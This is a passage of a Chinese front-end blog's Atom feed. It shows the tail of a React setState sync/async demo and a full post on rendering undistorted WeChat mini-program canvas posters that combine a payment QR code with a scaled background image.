class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 合成事件的处理函数 or 生命周期构造函数</span></span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// 表现异步</span></span><br><span class="line"> </span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;<span class="attr">count</span>: <span class="keyword">this</span>.state.count+<span class="number">1</span>&#125;)</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;<span class="attr">count</span>: <span class="keyword">this</span>.state.count+<span class="number">1</span>&#125;)</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 表现同步</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'render'</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;Demo组件：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.handleClick&#125;&gt;同步OR异步&lt;/</span>button&gt; </span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;props-类型校验&quot;&gt;&lt;a href=&quot;#props-类型校验&quot; class=&quot;headerlink&quot; title=&quot;props - 类型校验&quot;&gt;&lt;/a&gt;props - 类型校验&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;理解props都是外来的，在使用的时候如果数据类型不对，
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React组件" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6/"/>
    
      <category term="React组件高级" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6%E9%AB%98%E7%BA%A7/"/>
    
      <category term="React组件进阶" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6%E8%BF%9B%E9%98%B6/"/>
    
      <category term="props校验" scheme="//www.shen.ee/tags/props%E6%A0%A1%E9%AA%8C/"/>
    
      <category term="React生命周期" scheme="//www.shen.ee/tags/React%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    
      <category term="props默认值" scheme="//www.shen.ee/tags/props%E9%BB%98%E8%AE%A4%E5%80%BC/"/>
    
  </entry>
  
  <entry>
    <title>小程序canvas生成海报图片压缩和失真问题解决</title>
    <link href="//www.shen.ee/article/57435.html"/>
    <id>//www.shen.ee/article/57435.html</id>
    <published>2022-04-13T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.009Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>微信小程序实现canvas按照原图等比例不失真绘制海报图，防止模糊</p><p>我这里的场景是收款二维码+收款背景图。</p></blockquote><h2 id="绘制二维码"><a href="#绘制二维码" class="headerlink" title="绘制二维码"></a>绘制二维码</h2><p>我这里绘制二维码使用的 <a href="https://github.com/demi520/wxapp-qrcode" target="_blank" rel="noopener">wxapp-qrcode</a> ，也可以使用<a href="https://github.com/yingye/weapp-qrcode" target="_blank" rel="noopener">weapp-qrcode</a>，基本都一样，详细代码不过多累赘，这里主要说下适配不同屏幕大小的canvas。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">onLoad: <span class="function"><span class="keyword">function</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> size = <span class="keyword">this</span>.setCanvasSize() <span class="comment">// 动态设置画布大小</span></span><br><span class="line">  <span class="keyword">this</span>.createQrCode(<span class="string">'www.iyouhun.com'</span>, <span class="string">"mycanvas"</span>, size.w, size.h)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 适配不同屏幕大小的canvas</span></span><br><span class="line">setCanvasSize: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> size = &#123;&#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> res = wx.getSystemInfoSync()</span><br><span class="line">    <span class="keyword">var</span> scale = <span class="number">750</span> / <span class="number">686</span>; <span class="comment">// 不同屏幕下canvas的适配比例；设计稿是750宽，686是因为wxss样式文件中设置的canvas大小</span></span><br><span class="line">    <span class="keyword">var</span> width = res.windowWidth / scale</span><br><span class="line">    <span class="keyword">var</span> height = width; <span class="comment">// canvas画布为正方形</span></span><br><span class="line">    size.w = width</span><br><span class="line">    size.h = height</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"获取设备信息失败"</span> + e)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> size</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="绘制背景图"><a href="#绘制背景图" class="headerlink" title="绘制背景图"></a>绘制背景图</h2><h3 id="动态设置图片的高度和宽度"><a href="#动态设置图片的高度和宽度" class="headerlink" title="动态设置图片的高度和宽度"></a>动态设置图片的高度和宽度</h3><p>在小程序布局中，如果图片不是固定高度和高度，但<code>image</code>设置的是固定的高度和宽度，这时候原始图片相对<code>image</code>设置的固定高度和宽度不是等比例大小，那么这张图片就会变形，变的不清晰。这时就可以使用下面的等比例缩放的方式缩放图片，让图片不变形。或者通过<code>image</code>的<code>bindload</code>方法动态的获取图片的高度和宽度，动态的设置图片的高度和宽度，是图片布局的高度和宽度和原始图片的高度和宽度相等。</p><p><strong>图片等比例缩放工具</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Util.js </span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Util</span></span>&#123; </span><br><span class="line">  <span class="comment">/*** </span></span><br><span class="line"><span class="comment">   * 按照显示图片的宽等比例缩放得到显示图片的高 </span></span><br><span class="line"><span class="comment">   * @params originalWidth 原始图片的宽 </span></span><br><span class="line"><span class="comment">   * @params originalHeight 原始图片的高 </span></span><br><span class="line"><span class="comment">   * @params imageWidth   显示图片的宽，如果不传就使用屏幕的宽 </span></span><br><span class="line"><span class="comment">   * 返回图片的宽高对象 </span></span><br><span class="line"><span class="comment">  ***/</span> </span><br><span class="line">  <span class="keyword">static</span> imageZoomHeightUtil(originalWidth,originalHeight,imageWidth)&#123; </span><br><span class="line">    <span class="keyword">let</span> imageSize = &#123;&#125;; </span><br><span class="line">    <span class="keyword">if</span>(imageWidth)&#123; </span><br><span class="line">      imageSize.imageWidth = imageWidth; </span><br><span class="line">      imageSize.imageHeight = (imageWidth * originalHeight) / originalWidth; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果没有传imageWidth,使用屏幕的宽 </span></span><br><span class="line">      wx.getSystemInfo(&#123;  </span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;  </span><br><span class="line">          imageWidth = res.windowWidth;  </span><br><span class="line">          imageSize.imageWidth = imageWidth; </span><br><span class="line">          imageSize.imageHeight = (imageWidth * originalHeight) / originalWidth; </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> imageSize; </span><br><span class="line">  &#125; </span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*** </span></span><br><span class="line"><span class="comment">   * 按照显示图片的高等比例缩放得到显示图片的宽 </span></span><br><span class="line"><span class="comment">   * @params originalWidth 原始图片的宽 </span></span><br><span class="line"><span class="comment">   * @params originalHeight 原始图片的高 </span></span><br><span class="line"><span class="comment">   * @params imageHeight  显示图片的高，如果不传就使用屏幕的高 </span></span><br><span class="line"><span class="comment">   * 返回图片的宽高对象 </span></span><br><span class="line"><span class="comment">  ***/</span> </span><br><span class="line">  <span class="keyword">static</span> imageZoomWidthUtil(originalWidth,originalHeight,imageHeight)&#123; </span><br><span class="line">    <span class="keyword">let</span> imageSize = &#123;&#125;; </span><br><span class="line">    <span class="keyword">if</span>(imageHeight)&#123; </span><br><span class="line">      imageSize.imageWidth = (imageHeight *originalWidth) / originalHeight; </span><br><span class="line">      imageSize.imageHeight = imageHeight; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果没有传imageHeight,使用屏幕的高 </span></span><br><span class="line">      wx.getSystemInfo(&#123;  </span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;  </span><br><span class="line">          imageHeight = res.windowHeight; </span><br><span class="line">          imageSize.imageWidth = (imageHeight *originalWidth) / originalHeight; </span><br><span class="line">          imageSize.imageHeight = imageHeight; </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> imageSize; </span><br><span class="line">  &#125; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Util;</span><br></pre></td></tr></table></figure><p><strong>工具库使用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;image bindload=&quot;imageLoad&quot;  src=&quot;../test.png&quot;/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Util <span class="keyword">from</span> <span class="string">'../common/Util'</span></span><br><span class="line"> </span><br><span class="line">Page(&#123; </span><br><span class="line"> data:&#123; </span><br><span class="line">    imageWidth:<span class="number">0</span>, </span><br><span class="line">    imageHeight:<span class="number">0</span> </span><br><span class="line"> &#125;, </span><br><span class="line"> imageLoad: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;  </span><br><span class="line">    <span class="comment">//获取图片的原始宽度和高度 </span></span><br><span class="line">    <span class="keyword">let</span> originalWidth = e.detail.width</span><br><span class="line">    <span class="keyword">let</span> originalHeight = e.detail.height</span><br><span class="line">    <span class="keyword">let</span> imageSize = Util.imageZoomWidthUtil(originalWidth,originalHeight,<span class="number">145</span>)</span><br><span class="line">    <span class="keyword">this</span>.setData(&#123;<span class="attr">imageWidth</span>:imageSize.imageWidth,<span class="attr">imageHeight</span>:imageSize.imageHeight&#125;)</span><br><span class="line"> &#125; </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="绘制背景图-1"><a href="#绘制背景图-1" class="headerlink" title="绘制背景图"></a>绘制背景图</h3><p>用上面的方法动态设置图片宽高，解决失真问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Util <span class="keyword">from</span> <span class="string">'../../libs/Util'</span></span><br><span class="line"><span class="comment">// 背景图</span></span><br><span class="line"><span class="keyword">let</span> bgImg = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">  wx.getImageInfo(&#123;</span><br><span class="line">    src: <span class="string">'https://www.iyouhun.com/payment/payment_pic.jpg'</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">      that.setData(&#123;</span><br><span class="line">        imgInfo: res</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 根据屏幕宽度得到图片高</span></span><br><span class="line">      <span class="keyword">const</span> imageSize = Util.imageZoomHeightUtil(that.data.imgInfo.width, that.data.imgInfo.height) </span><br><span class="line">      that.setData(&#123; <span class="attr">canvasHeight</span>: imageSize.imageHeight &#125;)</span><br><span class="line">      resolve(res.path)</span><br><span class="line">    &#125;,</span><br><span class="line">    fail: <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err)</span><br><span class="line">      wx.showToast(&#123;</span><br><span class="line">        title: <span class="string">'网络错误请重试'</span>,</span><br><span class="line">        icon: <span class="string">'loading'</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="合成海报-收款码"><a href="#合成海报-收款码" class="headerlink" title="合成海报/收款码"></a>合成海报/收款码</h2><p>这里使用<code>Promise</code>分别去绘制二维码和背景图。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 收款码</span></span><br><span class="line"><span class="keyword">let</span> qrcodeImg = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 背景图</span></span><br><span class="line"><span class="keyword">let</span> bgImg = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Promise</span>.all([bgImg, qrcodeImg]).then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">  wx.showLoading(&#123;<span class="attr">title</span>: <span class="string">'加载中'</span>&#125;)</span><br><span class="line">  <span class="comment">// canvas绘制文字和图片，创建画图</span></span><br><span class="line">  <span class="keyword">const</span> ctx = wx.createCanvasContext(<span class="string">'myCanvas'</span>)</span><br><span class="line">  <span class="comment">// 绘制背景图</span></span><br><span class="line">  ctx.drawImage(result[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>, that.data.imgInfo.width, that.data.imgInfo.height, <span class="number">0</span>, <span class="number">0</span>, that.data.canvasWidth, that.data.canvasHeight)</span><br><span class="line">  ctx.setFillStyle(<span class="string">'white'</span>)</span><br><span class="line">  <span class="comment">// 绘制二维码 二维码宽度300</span></span><br><span class="line">  <span class="keyword">const</span> qrX = (that.data.canvasWidth - <span class="number">300</span>) / <span class="number">2</span> <span class="comment">// canvas宽度 - 二维码宽度 / 2 (居中)</span></span><br><span class="line">  ctx.drawImage(result[<span class="number">1</span>], qrX, <span class="number">120</span>, <span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">  <span class="comment">// 绘制文本</span></span><br><span class="line">  ctx.fillStyle = <span class="string">'#ffffff'</span> <span class="comment">// 背景</span></span><br><span class="line">  ctx.fillRect(<span class="built_in">Math</span>.floor(qrX),<span class="number">420</span>,<span class="number">300</span>,<span class="number">20</span>)</span><br><span class="line">  ctx.fillStyle = <span class="string">"#333333"</span></span><br><span class="line">  ctx.font = <span class="number">25</span> + <span class="string">'px Arial'</span> <span class="comment">// 文本大小, 字体</span></span><br><span class="line">  ctx.textAlign = <span class="string">'center'</span></span><br><span class="line">  ctx.fillText(</span><br><span class="line">    <span class="string">'No.'</span>+ that.data.serialNum,</span><br><span class="line">    that.data.canvasWidth / <span class="number">2</span>, <span class="comment">// 左上角 X坐标</span></span><br><span class="line">    <span class="number">430</span>, <span class="comment">// 左上角 Y坐标</span></span><br><span class="line">    <span class="number">300</span></span><br><span class="line">  )</span><br><span class="line">  <span class="comment">//canvasToTempFilePath必须要在draw的回调中执行，否则会生成失败，官方文档有说明</span></span><br><span class="line">  ctx.draw(<span class="literal">false</span>, setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    wx.canvasToTempFilePath(&#123;</span><br><span class="line">      canvasId: <span class="string">'myCanvas'</span>,</span><br><span class="line">      x: <span class="number">0</span>,</span><br><span class="line">      y: <span class="number">0</span>,</span><br><span class="line">      width: that.data.canvasWidth,</span><br><span class="line">      height: that.data.canvasHeight,</span><br><span class="line">      success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        wx.hideLoading()</span><br><span class="line">        that.setData(&#123;</span><br><span class="line">          qrcodeStatus: <span class="literal">true</span>,</span><br><span class="line">          shareImgSrc: res.tempFilePath</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">      fail: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        wx.hideLoading()</span><br><span class="line">        wx.showToast(&#123;</span><br><span class="line">          title: <span class="string">'生成失败'</span>,</span><br><span class="line">          icon: <span class="string">"none"</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, <span class="number">1000</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>效果图</strong></p><p><img src="https://oss.iyouhun.com/img/WechatIMG1762.jpeg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;微信小程序实现canvas按照原图等比例不失真绘制海报图，防止模糊&lt;/p&gt;
&lt;p&gt;我这里的场景是收款二维码+收款背景图。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;绘制二维码&quot;&gt;&lt;a href=&quot;#绘制二维码&quot; class=&quot;header
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="小程序" scheme="//www.shen.ee/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
      <category term="微信小程序" scheme="//www.shen.ee/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
      <category term="canvas" scheme="//www.shen.ee/tags/canvas/"/>
    
      <category term="canvas海报" scheme="//www.shen.ee/tags/canvas%E6%B5%B7%E6%8A%A5/"/>
    
      <category term="小程序海报" scheme="//www.shen.ee/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%B7%E6%8A%A5/"/>
    
  </entry>
  
</feed>
